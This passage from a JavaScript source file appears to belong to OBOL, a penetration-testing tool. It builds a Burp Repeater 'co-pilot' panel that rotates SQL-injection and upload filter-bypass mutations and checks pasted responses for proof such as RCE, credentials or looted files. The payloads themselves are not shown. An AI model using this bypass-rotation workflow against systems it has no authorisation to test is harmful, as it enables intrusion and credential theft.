        + '</div>';
    }

    // Bypass / payload mutation pills
    var triedMap = st.triedByFamily[fam.id] || {};
    html += '<div class="burp-mut-bar" role="group" aria-label="Payload and filter-bypass mutations">'
      + fam.mutations.map(function (m, idx) {
        var on = idx === st.mutIdx;
        var tried = !!triedMap[m.id];
        return '<button type="button" class="burp-mut-pill' + (on ? ' on' : '') + (tried ? ' is-tried' : '') + '" data-burp-mut-idx="' + idx + '" aria-pressed="' + (on ? 'true' : 'false') + '">'
          + esc((idx + 1) + '. ' + m.label) + (tried ? ' (tried)' : '') + '</button>';
      }).join('')
      + '</div>';

    var mutated = mutateRequest(activeReq, fam, mut, st.paramName);

    // Verdict banner if evaluated
    if (st.verdict) {
      html += '<div class="burp-verdict ' + (st.verdict.ok ? 'is-win' : 'is-rotate') + '" role="status">'
        + '<strong>' + esc(st.verdict.title) + ':</strong> ' + esc(st.verdict.detail)
        + '</div>';
    }

    html += '<div class="burp-mut-note">' + esc(mut.note) + '</div>';

    // Live mutated request viewer (scrollable <pre tabindex="0"><code> with <mark> glow)
    html += '<div class="burp-req-viewer">'
      + '<div class="burp-viewer-head">'
      + '<span>Mutated Repeater Request (<code>' + esc(activeReq.method + ' ' + activeReq.pathname) + '</code>)</span>'
      + '<div class="burp-copy-group">'
      + '<button type="button" class="btn-primary btn-copy burp-copy-btn" data-copy="' + attr(mutated.raw) + '">Copy Mutated Repeater Request</button>'
      + '<button type="button" class="btn-ghost btn-copy burp-copy-btn" data-copy="' + attr(mutated.curl) + '">Copy Equivalent 1-Click curl</button>'
      + '</div></div>'
      + '<pre class="burp-req-pre" tabindex="0"><code>' + mutated.html + '</code></pre>'
      + '</div>';

    // Equivalent curl preview inside searchable native <details>
    html += '<details class="burp-curl-details">'
      + '<summary>Show equivalent 1-click CLI curl command</summary>'
      + '<pre class="burp-curl-pre" tabindex="0"><code>' + esc(mutated.curl) + '</code></pre>'
      + '</details>';

    // Step 3 response verification box
    html += '<div class="burp-verify-box">'
      + '<div class="burp-box-head"><strong>Step 3: Click Send in Burp Repeater, then paste the HTTP Response</strong></div>'
      + '<textarea class="burp-textarea" data-burp-resp-input="1" rows="4" spellcheck="false" placeholder="HTTP/1.1 200 OK&#10;Content-Type: text/html&#10;&#10;Paste the Repeater response headers + body here so OBOL checks for proof or rotates to the next bypass..."></textarea>'
      + '<div class="burp-action-row">'
      + '<button type="button" class="btn-primary" data-burp-verify-resp="1" data-burp-curl="' + attr(mutated.curl) + '">Verify Response &amp; Advance</button>'
      + '<button type="button" class="btn-ghost" data-burp-next-bypass="1">Blocked / 403 -&gt; Next Bypass</button>'
      + '<span class="burp-status" data-burp-resp-status="1" role="status"></span>'
      + '</div></div>';

    html += '</div>';
    return html;
  }

  function _ensureParsersReady() {
    if (OBOL.ingest && typeof OBOL.ingest.ensureParsers === 'function') {
      return OBOL.ingest.ensureParsers();
    }
    if (OBOL.parsers) return Promise.resolve(true);
    if (OBOL.lazy && OBOL.lazy.loadGroup) {
      return OBOL.lazy.loadGroup('parsers').then(function () { return !!OBOL.parsers; });
    }
    return Promise.resolve(!!OBOL.parsers);
  }

  function bindEvents(mount, hooks) {
    if (!mount || mount._obolBurpBound) return;
    mount._obolBurpBound = true;
    hooks = hooks || {};

    function repaint(rootEl) {
      if (typeof hooks.onRepaint === 'function') {
        hooks.onRepaint(rootEl);
        return;
      }
      var host = (rootEl && rootEl.parentNode) || mount.querySelector('[data-pillar-section="burp"]') || mount.querySelector('#wb-burp-host');
      if (host) {
        var tIp = (rootEl && rootEl.getAttribute('data-burp-target')) || '';
        var actId = (rootEl && rootEl.getAttribute('data-burp-action')) || '';
        var move = (actId && OBOL.packs && OBOL.packs.actions) ? OBOL.packs.actions().filter(function (a) { return a.id === actId; })[0] : null;
        host.innerHTML = renderPanel({ targetIp: tIp, move: move });
      }
    }

    function on(evt, sel, fn) {
      if (U.on) {
        U.on(mount, evt, sel, fn);
      } else {
        mount.addEventListener(evt, function (e) {
          var t = e.target && e.target.closest ? e.target.closest(sel) : null;
          if (t && mount.contains(t)) fn(e, t);
        });
      }
    }

    on('click', '[data-burp-sample]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var tIp = rootEl.getAttribute('data-burp-target') || '10.10.10.5';
      var kind = t.getAttribute('data-burp-sample');
      var ta = rootEl.querySelector('[data-burp-req-input]');
      if (!ta) return;
      if (kind === 'upload') {
        ta.value = 'POST /upload.php HTTP/1.1\nHost: ' + tIp + '\nCookie: PHPSESSID=obolsession123\nContent-Type: multipart/form-data; boundary=----OBOLFormBoundary9912\n\n------OBOLFormBoundary9912\nContent-Disposition: form-data; name="file"; filename="avatar.png"\nContent-Type: image/png\n\nPNGDATA\n------OBOLFormBoundary9912\nContent-Disposition: form-data; name="submit"\n\nupload\n------OBOLFormBoundary9912--';
      } else {
        ta.value = 'POST /login.php HTTP/1.1\nHost: ' + tIp + '\nCookie: PHPSESSID=obolsession123\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=test&csrf_token=9f8e7d6c5b4a';
      }
      ta.focus();
    });

    on('click', '[data-burp-new-req]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var st = getState(rootEl.getAttribute('data-burp-target'));
      st.forceCapture = true;
      st.verdict = null;
      repaint(rootEl);
    });

    on('click', '[data-burp-cancel-capture]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var st = getState(rootEl.getAttribute('data-burp-target'));
      st.forceCapture = false;
      repaint(rootEl);
    });

    on('click', '[data-burp-parse-req]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var tIp = rootEl.getAttribute('data-burp-target') || '10.10.10.5';
      var actId = rootEl.getAttribute('data-burp-action') || 'operator-ingest';
      var ta = rootEl.querySelector('[data-burp-req-input]');
      var statusEl = rootEl.querySelector('[data-burp-status]');
      var raw = (ta && ta.value) || '';
      if (!raw.trim()) {
        if (statusEl) statusEl.textContent = 'Paste a raw HTTP request first.';
        return;
      }
      if (statusEl) statusEl.textContent = 'Parsing request...';
      _ensureParsersReady().then(function (ok) {
        if (!ok) {
          if (statusEl) statusEl.textContent = 'Parsers still loading - try again.';
          return;
        }
        var st = getState(tIp);
        st.forceCapture = false;
        st.reqIdx = 0;
        st.paramName = '';
        st.verdict = null;
        if (OBOL.ingest && typeof OBOL.ingest.run === 'function') {
          var res = OBOL.ingest.run({
            text: raw,
            command: '',
            actionId: actId,
            source: 'burp-copilot',
            scope: tIp ? ('host:' + tIp) : undefined
          });
          var eng = (OBOL.store && OBOL.store.active && OBOL.store.active()) || {};
          var saved = savedRequestsForTarget(eng, OBOL.store && OBOL.store.factSetForTarget ? OBOL.store.factSetForTarget(tIp) : null, tIp);
          if (!saved.length) {
            if (statusEl) statusEl.textContent = 'Not recognized as a raw HTTP request (expected METHOD /path HTTP/1.1 + Host: header).';
            return;
          }
          if (saved[0] && saved[0].boundary) st.family = 'upload';
          if (U.toast) U.toast('Captured ' + saved[0].method + ' ' + saved[0].pathname + ' into Burp Co-Pilot');
          if (typeof hooks.onIngested === 'function') hooks.onIngested(res);
          else repaint(rootEl);
        }
      });
    });

    on('click', '[data-burp-req-idx]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var st = getState(rootEl.getAttribute('data-burp-target'));
      st.reqIdx = parseInt(t.getAttribute('data-burp-req-idx'), 10) || 0;
      st.paramName = '';
      st.verdict = null;
      repaint(rootEl);
    });

    on('click', '[data-burp-fam]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var st = getState(rootEl.getAttribute('data-burp-target'));
      st.family = t.getAttribute('data-burp-fam') || 'sqli';
      st.mutIdx = 0;
      st.verdict = null;
      repaint(rootEl);
    });

    on('click', '[data-burp-param]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var st = getState(rootEl.getAttribute('data-burp-target'));
      st.paramName = t.getAttribute('data-burp-param') || '';
      st.verdict = null;
      repaint(rootEl);
    });

    on('click', '[data-burp-mut-idx]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var st = getState(rootEl.getAttribute('data-burp-target'));
      st.mutIdx = parseInt(t.getAttribute('data-burp-mut-idx'), 10) || 0;
      st.verdict = null;
      repaint(rootEl);
    });

    on('click', '[data-burp-next-bypass]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var st = getState(rootEl.getAttribute('data-burp-target'));
      var fam = getFamily(st.family);
      var curMut = fam.mutations[st.mutIdx];
      st.triedByFamily[fam.id] = st.triedByFamily[fam.id] || {};
      if (curMut) st.triedByFamily[fam.id][curMut.id] = true;
      var nextIdx = (st.mutIdx + 1) % fam.mutations.length;
      st.mutIdx = nextIdx;
      st.verdict = {
        ok: false,
        title: 'Rotated to Bypass #' + (nextIdx + 1) + ' (' + fam.mutations[nextIdx].label + ')',
        detail: 'Copy the updated Repeater request below and click Send in Burp.'
      };
      repaint(rootEl);
    });

    on('click', '[data-burp-verify-resp]', function (_e, t) {
      var rootEl = t.closest('[data-burp-root]');
      if (!rootEl) return;
      var tIp = rootEl.getAttribute('data-burp-target') || '10.10.10.5';
      var actId = rootEl.getAttribute('data-burp-action') || 'operator-ingest';
      var curlCmd = t.getAttribute('data-burp-curl') || '';
      var ta = rootEl.querySelector('[data-burp-resp-input]');
      var statusEl = rootEl.querySelector('[data-burp-resp-status]');
      var respText = (ta && ta.value) || '';
      if (!respText.trim()) {
        if (statusEl) statusEl.textContent = 'Paste the HTTP response from Repeater first.';
        return;
      }
      if (statusEl) statusEl.textContent = 'Verifying response...';
      _ensureParsersReady().then(function (ok) {
        if (!ok) {
          if (statusEl) statusEl.textContent = 'Parsers still loading - try again.';
          return;
        }
        var st = getState(tIp);
        var fam = getFamily(st.family);
        var curMut = fam.mutations[st.mutIdx];
        var res = (OBOL.ingest && typeof OBOL.ingest.run === 'function')
          ? OBOL.ingest.run({
              text: respText,
              command: curlCmd,
              actionId: actId,
              source: 'burp-repeater',
              scope: tIp ? ('host:' + tIp) : undefined
            })
          : { ok: false, added: 0, facts: [] };

        var mintedKinds = (res && Array.isArray(res.facts)) ? res.facts.map(function (f) { return f.kind; }) : [];
        var hasWinFact = mintedKinds.some(function (k) {
          return /^foothold\.|^access\.|^web\..*_confirmed$|^web\.authz_bypass$|^web\.rce$|^db\.creds$|^credential\.(?:available|plaintext|validated)$|^loot\.files$/.test(k);
        });
        var looksBlocked = /^HTTP\/[12](?:\.\d)?\s+(?:401|403|406|415|422|429|500)\b/im.test(respText)
          || /\b(?:not allowed|invalid extension|forbidden|access denied|csrf|blocked|unacceptable)\b/i.test(respText);

        if (hasWinFact || (res && res.added > 0 && !looksBlocked)) {
          st.verdict = {
            ok: true,
            title: 'Proof Confirmed (' + (mintedKinds.slice(0, 3).join(', ') || (res.added + ' fact(s)')) + ')',
            detail: 'Evidence recorded into your engagement facts and run ledger.'
          };
          if (U.toast) U.toast(OBOL.ingest && OBOL.ingest.outcomeMessage ? OBOL.ingest.outcomeMessage(res) : 'Proof confirmed from Burp response');
          if (typeof hooks.onVerifiedWin === 'function') {
            hooks.onVerifiedWin(res);
            return;
          }
          repaint(rootEl);
          return;
        }

        // Blocked or zero proof -> auto-rotate to next untried bypass
        st.triedByFamily[fam.id] = st.triedByFamily[fam.id] || {};
        if (curMut) st.triedByFamily[fam.id][curMut.id] = true;
        var nextIdx = (st.mutIdx + 1) % fam.mutations.length;
        for (var k = 0; k < fam.mutations.length; k++) {
          var cand = (st.mutIdx + 1 + k) % fam.mutations.length;
          if (!st.triedByFamily[fam.id][fam.mutations[cand].id]) { nextIdx = cand; break; }
        }
        st.mutIdx = nextIdx;
        st.verdict = {
          ok: false,
          title: (looksBlocked ? 'Filter / Block Detected' : 'No Proof Signal Yet') + ' -> Rotated to #' + (nextIdx + 1) + ' (' + fam.mutations[nextIdx].label + ')',
          detail: 'Updated request ready below. Copy it into Repeater and click Send.'
        };
        repaint(rootEl);
      });
    });
  }

  OBOL.burpCopilot = {
    isEligibleMove: isEligibleMove,
    shouldAutoOpen: shouldAutoOpen,
    savedRequestsForTarget: savedRequestsForTarget,
    mutateRequest: mutateRequest,
    renderPanel: renderPanel,
    bindEvents: bindEvents
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
